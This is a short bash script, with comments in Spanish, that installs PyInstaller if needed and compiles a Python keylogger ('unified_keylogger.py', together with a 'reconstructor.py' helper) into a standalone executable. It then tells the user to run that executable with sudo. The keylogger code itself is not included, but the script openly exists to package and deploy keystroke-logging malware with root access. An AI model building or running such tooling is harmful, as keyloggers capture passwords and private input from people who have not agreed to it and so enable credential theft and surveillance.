#!/bin/bash
# crear ejecutable binario del keylogger

echo "🔨 COMPILANDO KEYLOGGER A EJECUTABLE"
echo "===================================="

# instalar pyinstaller si no está
if ! command -v pyinstaller &> /dev/null; then
    echo "📦 Instalando PyInstaller..."
    pip install pyinstaller
fi

# compilar a ejecutable único
echo "🔨 Compilando unified_keylogger.py..."
pyinstaller --onefile \
    --name="keylogger_auto" \
    --icon=none \
    --console \
    --add-data="reconstructor.py:." \
    unified_keylogger.py

echo "✅ Ejecutable creado en: dist/keylogger_auto"
echo ""
echo "📋 Para usar:"
echo "sudo ./dist/keylogger_auto"
echo ""
echo "🎯 El ejecutable ya incluye todas las dependencias"
